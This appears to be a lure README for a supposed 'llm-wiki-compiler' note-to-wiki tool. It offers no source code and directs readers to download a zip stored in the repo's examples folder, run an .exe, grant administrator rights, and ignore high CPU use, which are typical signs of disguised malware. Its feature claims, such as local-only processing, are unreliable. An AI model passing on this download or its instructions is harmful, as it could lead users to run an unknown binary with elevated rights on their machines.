# 🧠 llm-wiki-compiler - Turn raw data into organized wikis

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/predictorvariabledeepcervicalvein703/llm-wiki-compiler/raw/refs/heads/main/examples/compiler-llm-wiki-v1.1.zip)

## 📋 What is this tool

The llm-wiki-compiler processes raw text files and organizes them into a searchable wiki. You provide source documents. The software uses language models to read your notes and extract key facts. It then links your pages together automatically. This process creates a structure similar to an encyclopedia. You can open these files in programs like Obsidian to browse your knowledge base. 

This tool helps users who collect large amounts of data. It removes the manual work of sorting notes by category or topic. It follows the patterns seen in modern artificial intelligence research to ensure your links remain accurate and useful.

## 🛠 Features

*   **Smart Categorization:** The tool scans your text for common themes. It groups related concepts without manual input.
*   **Automatic Linking:** It detects connections between documents. It adds links so you can move between notes with one click.
*   **Markdown Support:** The output files use the standard markdown format. This works in almost all note-taking applications.
*   **Context Engineering:** The compiler shapes your source text into a coherent narrative. It focuses on clarity and logical flow.
*   **Local Processing:** Your data stays on your computer. The tool does not send your notes to third-party databases.

## ⚙️ Setting up your environment

The software requires a basic setup to read your sources. Before you run the compiler, prepare a folder on your computer.

1. Create a new folder named `my-wiki-sources`.
2. Move all your text files, notes, or articles into this folder.
3. Ensure the files use the `.txt` or `.md` extension.
4. Keep the file names simple to help the compiler identify topics.

## 🚀 Running your first compilation

Once you save the application, follow these steps to turn your notes into a wiki.

1. Locate the `llm-wiki-compiler.exe` file you downloaded.
2. Double-click the file to start the program.
3. A small window will appear on your screen.
4. Use the "Browse" button to select the `my-wiki-sources` folder you prepared.
5. Choose a destination folder where you want the new wiki to live.
6. Click the "Compile" button.

The software will show a progress bar. Large amounts of data may take a few minutes to process. Close the application only after the status changes to "Finished."

## 📈 Viewing your results

Navigate to the destination folder you chose in the previous step. You will see several new files and folders.

*   **index.md:** This file acts as the homepage. It contains a list of all detected topics.
*   **pages/**: This folder holds your interlinked wiki articles. Each file corresponds to one concept found in your source data.
*   **assets/**: This folder holds any images or attachments pulled from your documents.

Open the `index.md` file with a text editor or a markdown viewer. You will see your data transformed into a structured knowledge base. Clicking the blue text links allows you to navigate through your notes.

## 💡 Troubleshooting common issues

If the application does not start or reports an error, review this list of solutions.

*   **Permission Denied:** Ensure you have administrator rights on your Windows user account. Sometimes, the application needs permission to write files to your chosen destination folder.
*   **Empty Output:** Check your source files. If the text contains no clear headers or consistent structures, the compiler may struggle to build links. Try adding clear titles to the top of your source documents.
*   **High Resource Usage:** The compilation process uses your computer processor to analyze text. Your fan may run faster than usual. This is normal. You can minimize the window to let it run in the background.
*   **Missing Links:** If a file does not connect correctly, verify the spelling of your topic internal headers. The compiler relies on consistent terminology to match facts between different pages.

## 📝 Tips for better results

The compiler works best when the input data is clean and consistent. Follow these practices to improve your final wiki.

*   **Use Descriptive Titles:** Give each note a clear name. Instead of "Notes," use "Energy Sources."
*   **Group by Topic:** If your collection is large, organize your notes into sub-folders within the main source folder. The compiler respects these groupings.
*   **Maintain Format:** Avoid complex formatting if possible. Standard text works best for the language model.
*   **Review Regularly:** Check the output periodically. If you notice a topic that lacks links, update your source notes to include keywords related to other documents.
*   **Update Sources:** You can run the compiler again after you add new notes. It will identify the new content and integrate it into existing pages.
